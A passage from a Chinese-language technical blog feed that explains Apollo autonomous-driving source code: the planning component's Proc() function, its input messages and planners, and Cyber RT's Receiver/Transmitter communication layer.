href="#input">输入</a>部分。</p><p>我们先把诸多疑问抛置脑后，直接来看 <code>Proc()</code> 函数的第二部分。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (config_.<span class="hljs-built_in">learning_mode</span>() != PlanningConfig::NO_LEARNING) &#123;<br>  <span class="hljs-comment">// data process for online training</span><br>  message_process_.<span class="hljs-built_in">OnChassis</span>(*local_view_.chassis);<br>  message_process_.<span class="hljs-built_in">OnPrediction</span>(*local_view_.prediction_obstacles);<br>  message_process_.<span class="hljs-built_in">OnRoutingResponse</span>(*local_view_.routing);<br>  message_process_.<span class="hljs-built_in">OnStoryTelling</span>(*local_view_.stories);<br>  message_process_.<span class="hljs-built_in">OnTrafficLightDetection</span>(*local_view_.traffic_light);<br>  message_process_.<span class="hljs-built_in">OnLocalization</span>(*local_view_.localization_estimate);<br>&#125;<br><span class="hljs-comment">// publish learning data frame for RL test</span><br><span class="hljs-keyword">if</span> (config_.<span class="hljs-built_in">learning_mode</span>() == PlanningConfig::RL_TEST) &#123;<br>  PlanningLearningData planning_learning_data;<br>  LearningDataFrame* learning_data_frame =<br>      injector_-&gt;<span class="hljs-built_in">learning_based_data</span>()-&gt;<span class="hljs-built_in">GetLatestLearningDataFrame</span>();<br>  <span class="hljs-keyword">if</span> (learning_data_frame) &#123;<br>    planning_learning_data.<span class="hljs-built_in">mutable_learning_data_frame</span>()<br>                          -&gt;<span class="hljs-built_in">CopyFrom</span>(*learning_data_frame);<br>    common::util::<span class="hljs-built_in">FillHeader</span>(node_-&gt;<span class="hljs-built_in">Name</span>(), &amp;planning_learning_data);<br>    planning_learning_data_writer_-&gt;<span class="hljs-built_in">Write</span>(planning_learning_data);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    AERROR &lt;&lt; <span class="hljs-string">&quot;fail to generate learning data frame&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从注释中看出，<code>MessageProcess</code> 类有用于线上训练的功能，在 <code>learning_mode</code> 打开时，它会收集刚刚输入得到信息。之后，<code>injector_</code> 获得最新的学习数据帧（frame），并通过 <code>planning_learning_data_writer_</code> 发布者发布，用于强化学习（Reinforcement Learning）测试。</p><p>同样，跳过学习部分（这不是我所关心的重点），再来看第三部分代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">ADCTrajectory adc_trajectory_pb;<br>planning_base_-&gt;<span class="hljs-built_in">RunOnce</span>(local_view_, &amp;adc_trajectory_pb);<br>common::util::<span class="hljs-built_in">FillHeader</span>(node_-&gt;<span class="hljs-built_in">Name</span>(), &amp;adc_trajectory_pb);<br><br><span class="hljs-comment">// modify trajectory relative time due to the timestamp change in header</span><br><span class="hljs-keyword">auto</span> start_time = adc_trajectory_pb.<span class="hljs-built_in">header</span>().<span class="hljs-built_in">timestamp_sec</span>();<br><span class="hljs-type">const</span> <span class="hljs-type">double</span> dt = start_time - adc_trajectory_pb.<span class="hljs-built_in">header</span>().<span class="hljs-built_in">timestamp_sec</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; p : *adc_trajectory_pb.<span class="hljs-built_in">mutable_trajectory_point</span>()) &#123;<br>  p.<span class="hljs-built_in">set_relative_time</span>(p.<span class="hljs-built_in">relative_time</span>() + dt);<br>&#125;<br>planning_writer_-&gt;<span class="hljs-built_in">Write</span>(adc_trajectory_pb);<br><br><span class="hljs-comment">// record in history</span><br><span class="hljs-keyword">auto</span>* history = injector_-&gt;<span class="hljs-built_in">history</span>();<br>history-&gt;<span class="hljs-built_in">Add</span>(adc_trajectory_pb);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure><p>在第三部分代码中，首先调用 <code>RunOnce()</code> 函数生成了自动驾驶轨迹，放在了 <code>ADCTrajectory</code> 类的消息中，看来这就是生产规划路径的关键逻辑，这是我比较关心的。然后，根据注释，我推断，程序修改了轨迹中所有点的相对时间，并通过发布者 <code>planning_writer_</code> 发送消息，最后进行历史记录。至此，<code>PlanningComponent::Proc()</code> 函数结束。</p><span id="input">### 输入数据<p>前文说到，<code>Proc()</code> 函数先检查路由情况，再收集输入数据到 <code>local_view_</code> 这个私有变量中。为了弄清模块的输入输出信息，进而了解整个 Apollo 系统的数据流通情况，我需要对输入数据做一个全面的解读。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LocalView</span> &#123;<br>  std::shared_ptr&lt;prediction::PredictionObstacles&gt; prediction_obstacles;<br>  std::shared_ptr&lt;canbus::Chassis&gt; chassis;<br>  std::shared_ptr&lt;localization::LocalizationEstimate&gt; localization_estimate;<br>  std::shared_ptr&lt;perception::TrafficLightDetection&gt; traffic_light;<br>  std::shared_ptr&lt;routing::RoutingResponse&gt; routing;<br>  std::shared_ptr&lt;relative_map::MapMsg&gt; relative_map;<br>  std::shared_ptr&lt;PadMessage&gt; pad_msg;<br>  std::shared_ptr&lt;storytelling::Stories&gt; stories;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>prediction_obstacles 从信道中获得的指针，类型为 <code>PredictionObstacles</code>，代码文件在 <code>modules/prediction/proto/prediction_obstacle.proto</code> 中，该类型的消息来自<strong>预测模块</strong>，包含了以下信息：<ul><li><code>Header</code> 头结构：包含了这条消息<strong>发布的时刻</strong>（以秒为单位），目前位置的模块名，该消息的序列号（每个模块各自维护的）等，几乎每个消息都包含有这个头结构，下面就不提及了。</li><li><code>PredictionObstacle</code> 预测模块中的若干个障碍物行为：有感知模块中的障碍物（<code>PerceptionObstacle</code>），它包括障碍物的 id，它的三维坐标、速度加速度、边界大小（长高宽）、特殊的形状、类型（行人、非机动车、机动车）、运动轨迹等；还有时间戳，记录 GPS 给出的时刻；还有预测的时间长度；多种可能的运动轨迹；障碍物的运动趋势、优先级等。</li><li>开始的时间戳：记录预测开始的时刻</li><li>结束时间戳：预测结束的时刻</li><li>自动驾驶车辆的运动趋势，停止、正常行驶还是正在变道等</li><li><code>Scenery</code>  现在的场景</li></ul></li><li>chassis 从信道获得的指针，类型为 <code>Chassis</code>，这条消息直接来自<strong>总线 CanBus</strong>，代码文件在 <code>modules/canbus/proto/chassis.proto</code> 中，该类包含了很多信息，主要是汽车底盘所给出的机械状态信息，比如：<ul><li>驾驶模式，有手动驾驶、自动驾驶、仅控制方向、仅控制速度以及紧急模式</li><li>档位情况、引擎转速、车辆速度、里程表、燃油情况、电池电量等</li><li>刹车、油门踏板的力度，方向盘的旋转角度，车轮转速</li><li>转向灯、雾灯、大灯的工作情况</li></ul></li><li>localization_estimate 从信道中获得的指针，类型为 <code>LocalizationEstimate</code>，代码文件在 <code>modules/localization/proto/localization.proto</code> 中，这条消息来自<strong>定位模块</strong>，该类主要包含了：<ul><li><code>Pose</code> 位置姿势，包括车头朝向，在地图上的线速度、线加速度和相对位置，角速度、仰角度等</li><li>测量上述姿势的时刻</li><li>车辆已经经过的轨迹点列</li><li>MSF 定位状态与质量</li></ul></li></ul><p>上面的三条消息都是通过 <code>Proc()</code> 函数的参数传来的，回顾一下<a href="https://dingfen.github.io/apollo/2020/11/07/CyberCommu2.html">在通信里讲过的过程</a>，这三条信息会被融合起来，随后程序会唤醒封装了 <code>Component::Process()</code> 的协程，让协程处于 Ready 状态，最后通过调度算法会让某个线程对它进行执行。而以下介绍的五条消息，与上三条不一样，这些消息，是通过 <code>Reader</code> 获得的，回顾<a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html#reader-%E7%B1%BB">在这篇博客里讲的订阅者内容</a>，这些消息到来后，程序会唤醒封装了<em>入队操作</em>和 <em><code>Reader</code> 回调函数</em>的协程，让它处于 Ready 状态，最后调度算法调度某个线程进行执行。接下来，我们就详细看一下这五条消息吧：</p><ul><li>traffic_light 获得现在的交通信号灯情况，类型为 <code>TrafficLightDetection</code> ，来自<strong>感知模块</strong>，该类在 <code>modules/perception/camera/lib/traffic_light/detector/detection/detection.h</code> 中定义，主要是从摄像机拍摄的图片中获得目前的信号灯情况</li><li>routing 导航路线，类型为 <code>RoutingResponse</code> ，来自<strong>路由模块</strong>，从 <code>RoutingComponent</code> 类看出，<code>RoutingResponse</code> 就是该组件发布的消息类，类在 <code>modules/routing/proto/routing.proto</code> 文件中定义，<code>RoutingResponse</code> 包含有：<ul><li>导航中要通过的道路，以及总路程等</li><li><code>RoutingRequest</code> 可理解为要响应的路由请求</li><li>地图版本和现在的状态等</li></ul></li><li>relative_map 相对地图，类型为 <code>MapMsg</code>，是<code>RelativeMapComponent</code> 类发出的一个相对地图消息，在 <code>modules/map/relative_map/proto/navigation.proto</code> 文件中定义，包含<ul><li><code>Header</code> 头结构</li><li>车辆的高清的三维坐标，定位信息</li><li>系统中的编号与对应的路名、车道表</li><li>从感知模块中获得的车道线标记</li></ul></li><li>pad_msg 便笺，类在 <code>modules/planning/proto/pad_msg.proto</code> 定义，除了一个头结构外，仅包含了驾驶动作，比如直行跟随，左右变道，靠边停车等。</li></ul><h3 id="生成轨迹">生成轨迹</h3><p>在<a href="#Init">初始化</a>小节中，根据 <code>FLAGS_use_navigation_mode</code> 的设置， <code>planning_base_</code> 会指向不同的子类，或 <code>NaviPlanning</code> 类或是 <code>OnLanePlanning</code> 类，然后调用 <code>RunOnce()</code> 函数。</p><p>首先来看一下默认的规划类的 <code>OnLanePlanning::RunOnce()</code> 函数，回顾一下 <code>Component::Proc()</code> 函数的调用和组件的相关知识，你应该就会明白它是<strong>事件触发</strong>的，而不是时间触发的。该函数很长很复杂，很多地方我也并不关心（而且也看不懂），若有机会，可以细致地研究一下，大体上，它完成了以下步骤：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OnLanePlanning::RunOnce</span><span class="hljs-params">(<span class="hljs-type">const</span> LocalView&amp; local_view,</span></span><br><span class="hljs-params"><span class="hljs-function">                             ADCTrajectory* <span class="hljs-type">const</span> ptr_trajectory_pb)</span> </span>&#123;<br>    <span class="hljs-comment">//  更新汽车状态和参考线的状态，如果状态无效，直接返回</span><br>    <span class="hljs-comment">//  ...  </span><br>    <span class="hljs-comment">// 是否为出现导航路线变换，如果是 初始化 planner</span><br>    <span class="hljs-comment">//  加上预估的规划触发的周期 得到 stitchingTrajectory</span><br>  <span class="hljs-comment">// planning is triggered by prediction data, but we can still use an estimated</span><br>  <span class="hljs-comment">// cycle time for stitching</span><br>  status = <span class="hljs-built_in">InitFrame</span>(frame_num, stitching_trajectory.<span class="hljs-built_in">back</span>(), vehicle_state);<br>    <span class="hljs-comment">//  判断是否符合交通规则</span><br>    <span class="hljs-comment">//  开始正在的规划 planner 开始规划</span><br>  status = <span class="hljs-built_in">Plan</span>(start_timestamp, stitching_trajectory, ptr_trajectory_pb);<br>    <span class="hljs-comment">//  记录规划所花费的时间</span><br>    <span class="hljs-comment">//  ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>那么 <code>Planner</code> 又是什么东西呢？事实上才 <code>OnLanePlanning::Init()</code> 函数中就已经根据配置文件，由 <code>PlannerDispatcher</code> 指定了。我一共发现 4 种用于不同场景的 <code>Planner</code> ：</p><ul><li><code>RTKReplayPlanner</code>  根据录制的轨迹来规划行车路线</li><li><code>PublicRoadPlanner</code> 开放道路的轨迹规划器</li><li><code>LatticePlanner</code>  基于网格算法的轨迹规划器</li><li><code>NaviPlanner</code>  基于实时相对地图的规划器</li></ul><p>未完待续……</p><h2 id="参考">参考</h2><p>[1] <a href="https://github.com/ApolloAuto/apollo/">Github Apollo</a></p><p>[2] <a href="https://github.com/ApolloAuto/apollo/blob/r5.5.0/modules/planning/README.md">Apollo Planning Docs</a></p><p>[3] <a href="https://github.com/daohu527/Dig-into-Apollo/tree/master/modules/planning">apollo介绍之planning模块</a></p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Cyber RT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo Cyber RT 通信（下）</title>
    <link href="/2020/11/07/2020-11-7-CyberCommu2/"/>
    <url>/2020/11/07/2020-11-7-CyberCommu2/</url>
    
    <content type="html"><![CDATA[<h1>Apollo Cyber RT 通信（下）</h1><h2 id="前言">前言</h2><p>欢迎回来！今天我继续和大家聊 Cyber RT 的通信，<a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html">上文</a>我探讨了 Cyber RT 的两种通信方式和三种通信模型，并从通信架构的角度，一层层地给大家详细介绍了通信时代码的具体工作情况。由于通信内容过多，全放在一篇博客理论太长，于是我将这些内容简单地一分为二，事实上它们应当是有机的整体。</p><p>上文末尾，我介绍了 <code>Blocker</code> 类的功能，今天这篇博客，我们继续向深处进军↖(^ω^)↗。</p><center><img src="/img/CyberLayer.png" /></center>## Receiver & Transmitter<p>我们在上文已经认识了 <code>Reader</code> 和 <code>Writer</code> ，现在继续往下走。如果你仔细看代码的话，在 <code>Reader</code> 和 <code>Writer</code> 初始化时，都会分别构建好底层的 <code>Receiver</code> 和 <code>Transmitter</code> 对象。为了描述简便，我之前有意地忽略了，现在把它拿出来。<code>Reader</code> 部分的比较复杂，还使用了 <code>ReceiverManager</code> 进行管理；<code>Writer</code> 就比较直接了，在 <code>Init()</code> 函数中可以直接看到。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">bool</span> Reader&lt;MessageT&gt;::<span class="hljs-built_in">Init</span>() &#123;<br>receiver_ = ReceiverManager&lt;MessageT&gt;::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">GetReceiver</span>(role_attr_);<br>&#125;<br><br><span class="hljs-type">bool</span> Writer&lt;MessageT&gt;::<span class="hljs-built_in">Init</span>() &#123;<br>   <span class="hljs-comment">/*  ....   */</span><br>    transmitter_ =<br>        transport::Transport::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">CreateTransmitter</span>&lt;MessageT&gt;(role_attr_);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们不妨把这里作为突破口，打开新世界的大门。</p><span id="1"><h3 id="ReceiverManager">ReceiverManager</h3><p>之前提到过，<code>Reader</code> 在初始化时，需要用 <code>ReceiverManager::GetReceiver()</code> 获得 <code>Receiver</code> 对象。它的内部分封装了一个 <code>unordered_map</code> 表，将信道名字和与之对应的 <code>Receiver</code> 对象保存在表中。再看看下面的代码，可得出一个结论，<em>如果同一个进程内，不同的 <code>Reader</code> 对象订阅同一个信道，事实上使用的是同一个 <code>Receiver</code></em> <sup>2</sup>。再看看那个很长的 <code>CreateReceiver()</code> 函数调用，除了传递一个配置信息参数外，还有一个很长的回调函数。回调函数会做：</p><ul><li>加入一个 Transport 事件，类型为 Dispatch</li><li>调用数据分发器 <code>DataDispatcher::Dispatch()</code>  函数</li><li>加入一个 Transport 事件，类型为 Notify</li></ul><p>这些步骤具体做了什么？我们目前还不知道，求知的欲望驱使着我们继续往下探索。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-keyword">auto</span> ReceiverManager&lt;MessageT&gt;::<span class="hljs-built_in">GetReceiver</span>(<span class="hljs-type">const</span> proto::RoleAttributes&amp; role_attr) <br>    -&gt; <span class="hljs-keyword">typename</span> std::shared_ptr&lt;transport::Receiver&lt;MessageT&gt;&gt; &#123;<br>  <span class="hljs-comment">// because multi reader for one channel will write datacache multi times,</span><br>  <span class="hljs-comment">// so reader for datacache we use map to keep one instance for per channel</span><br>  <span class="hljs-type">const</span> std::string&amp; channel_name = role_attr.<span class="hljs-built_in">channel_name</span>();<br>    <span class="hljs-comment">// 如果信道名字对应的 Receiver 还没有创建 那就创建</span><br>  <span class="hljs-keyword">if</span> (receiver_map_.<span class="hljs-built_in">count</span>(channel_name) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// 一个巨长的 CreateReceiver() 函数调用</span><br>    receiver_map_[channel_name] = transport::Transport::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">CreateReceiver</span>&lt;MessageT&gt;(<br>            role_attr, [](<span class="hljs-type">const</span> std::shared_ptr&lt;MessageT&gt;&amp; msg,<br>                          <span class="hljs-type">const</span> transport::MessageInfo&amp; msg_info,<br>                          <span class="hljs-type">const</span> proto::RoleAttributes&amp; reader_attr) &#123;<br>              (<span class="hljs-type">void</span>)msg_info;<br>              (<span class="hljs-type">void</span>)reader_attr;<br>              PerfEventCache::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">AddTransportEvent</span>(<br>                  TransPerf::DISPATCH, reader_attr.<span class="hljs-built_in">channel_id</span>(),<br>                  msg_info.<span class="hljs-built_in">seq_num</span>());<br>              data::DataDispatcher&lt;MessageT&gt;::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">Dispatch</span>(<br>                  reader_attr.<span class="hljs-built_in">channel_id</span>(), msg);<br>              PerfEventCache::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">AddTransportEvent</span>(<br>                  TransPerf::NOTIFY, reader_attr.<span class="hljs-built_in">channel_id</span>(),<br>                  msg_info.<span class="hljs-built_in">seq_num</span>());<br>            &#125;);<br>  &#125;<br>    <span class="hljs-comment">// 如果已经有了 直接返回</span><br>  <span class="hljs-keyword">return</span> receiver_map_[channel_name];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Transport">Transport</h3><p><code>Transport</code> 类，单例模式，有如下指针成员，emm……在还没完全弄懂底层代码的情况下，也很难告诉你们这些类的具体作用：</p><ul><li><code>Participant</code> 类  FastRtps 相关</li><li><code>Notifier</code> 类 与 Shm 相关</li><li><code>IntraDispatcher</code> 类 Intra 的分发器</li><li><code>ShmDispatcher</code> 类 Shm 的分发器</li><li><code>RtpsDispatcher</code> 类 Rtps 的分发器</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transport</span> &#123;<br> <span class="hljs-keyword">private</span>:<br>  ParticipantPtr participant_ = <span class="hljs-literal">nullptr</span>;<br>  NotifierPtr notifier_ = <span class="hljs-literal">nullptr</span>;<br>  IntraDispatcherPtr intra_dispatcher_ = <span class="hljs-literal">nullptr</span>;<br>  ShmDispatcherPtr shm_dispatcher_ = <span class="hljs-literal">nullptr</span>;<br>  RtpsDispatcherPtr rtps_dispatcher_ = <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>和之前 Cyber RT 给人的感觉一样，一旦它要创建什么重要的东西，不调用个几层是根本不可能完成的。在这里，<code>Transport</code> 类的两个函数 <code>CreateTransmitter</code> 和 <code>CreateReceiver</code> 都会根据传入的 mode ，去构造出对应的子类对象，分别对应我在这篇博客开头提到的四种不同场景下的传输实现类。哦，提醒一下，默认的 mode 是 Hybrid ，也就是三种模式混用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M&gt;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Transport::CreateTransmitter</span><span class="hljs-params">(<span class="hljs-type">const</span> RoleAttributes&amp; attr,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-type">const</span> OptionalMode&amp; mode)</span> -&gt; <span class="hljs-keyword">typename</span> std::shared_ptr&lt;Transmitter&lt;M&gt;&gt; </span>&#123;<br>  <span class="hljs-comment">/*  ....  */</span><br> <span class="hljs-comment">// 往 modified_attr 中加入 qos profile</span><br> <span class="hljs-comment">// 根据各种模式 创建相应的 Transmitter 子类</span><br>  <span class="hljs-keyword">switch</span> (mode) &#123;<br>    <span class="hljs-keyword">case</span> OptionalMode::INTRA:<br>      transmitter = std::make_shared&lt;IntraTransmitter&lt;M&gt;&gt;(modified_attr);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> OptionalMode::SHM:<br>      transmitter = std::make_shared&lt;ShmTransmitter&lt;M&gt;&gt;(modified_attr);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> OptionalMode::RTPS:<br>      transmitter =<br>          std::make_shared&lt;RtpsTransmitter&lt;M&gt;&gt;(modified_attr, <span class="hljs-built_in">participant</span>());<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      transmitter =<br>          std::make_shared&lt;HybridTransmitter&lt;M&gt;&gt;(modified_attr, <span class="hljs-built_in">participant</span>());<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (mode != OptionalMode::HYBRID)<br>    transmitter-&gt;<span class="hljs-built_in">Enable</span>();<br>  <span class="hljs-keyword">return</span> transmitter;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Transmitter</code> 类是写消息，而 <code>Receiver</code> 类是读消息，因此 <code>Receiver</code> 类比 <code>Transmitter</code> 类多了一个参数 <code>MessageListener</code> ，其本质就是个回调函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> MessageListener = std::function&lt;<span class="hljs-built_in">void</span>(<span class="hljs-type">const</span> MessagePtr&amp;, <span class="hljs-type">const</span> MessageInfo&amp;, <span class="hljs-type">const</span> RoleAttributes&amp;)&gt;;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M&gt;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Transport::CreateReceiver</span><span class="hljs-params">(<span class="hljs-type">const</span> RoleAttributes&amp; attr,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> <span class="hljs-keyword">typename</span> Receiver&lt;M&gt;::MessageListener&amp; msg_listener,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> OptionalMode&amp; mode)</span> -&gt; <span class="hljs-keyword">typename</span> std::shared_ptr&lt;Receiver&lt;M&gt;&gt; </span>&#123;<br> <span class="hljs-comment">/*  ....   */</span><br> <span class="hljs-comment">// 往 modified_attr 中加入 qos profile</span><br> <span class="hljs-comment">// 根据各种模式 创建相应的 Receiver 子类</span><br>  <span class="hljs-keyword">switch</span> (mode) &#123;<br>    <span class="hljs-keyword">case</span> OptionalMode::INTRA:<br>      receiver =<br>          std::make_shared&lt;IntraReceiver&lt;M&gt;&gt;(modified_attr, msg_listener);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> OptionalMode::SHM:<br>      receiver = std::make_shared&lt;ShmReceiver&lt;M&gt;&gt;(modified_attr, msg_listener);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> OptionalMode::RTPS:<br>      receiver = std::make_shared&lt;RtpsReceiver&lt;M&gt;&gt;(modified_attr, msg_listener);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      receiver = std::make_shared&lt;HybridReceiver&lt;M&gt;&gt;(<br>          modified_attr, msg_listener, <span class="hljs-built_in">participant</span>());<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (mode != OptionalMode::HYBRID)<br>    receiver-&gt;<span class="hljs-built_in">Enable</span>();<br>  <span class="hljs-keyword">return</span> receiver;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后一部分代码：在 <code>Receiver</code> 对象被创建时，只要模式不是 Hybrid，都会立刻调用 <code>Receiver::Enable()</code> 函数开启接收。</p><span id="2"><h3 id="Receiver-Transmitter">Receiver &amp; Transmitter</h3><p>这两个类是 <code>EndPoint</code> 的子类。关于 <code>Endpoint</code> 类<sup>5</sup>，那可就是整个架构的类继承的终点了，其内部有三个成员</p><ul><li><code>bool enabled_</code> 用来标记是否被启用</li><li><code>Identity id_</code> 用于标识，对于每个 <code>Endpoint</code> 对象拥有唯一的 id 号，其子类也是用这个来进行标识</li><li><code>RoleAttributes attr_</code> 用来记录配置文件中的数据。</li></ul><p>其中 <code>Receiver</code> 类只有一个回调函数 <code>msg_listener_</code>，该回调函数就是 <code>Receiver</code> 构造时传入的函数。在新消息到来时，会被调用👇：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M&gt;<br><span class="hljs-type">void</span> Receiver&lt;M&gt;::<span class="hljs-built_in">OnNewMessage</span>(<span class="hljs-type">const</span> MessagePtr&amp; msg,<br>                               <span class="hljs-type">const</span> MessageInfo&amp; msg_info) &#123;<br>  <span class="hljs-keyword">if</span> (msg_listener_ != <span class="hljs-literal">nullptr</span>)<br>    <span class="hljs-built_in">msg_listener_</span>(msg, msg_info, attr_);<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <a href="#1">ReceiverManager</a> 那一小节中，已经说到该函数有三个步骤，其中<sup>5</sup>，调用 <code>DataDispatcher::Dispatch</code> 非常关键。因为从这步可以看出上层和底层最终完成了闭环。当底层 <code>Receiver</code> 的回调函数 <code>msg_listener</code> 收到消息被调用时，上层的分发器 <code>DataDispatcher</code> 会把来自底层的消息发到等待的消息缓存里，然后调用上层的通知器 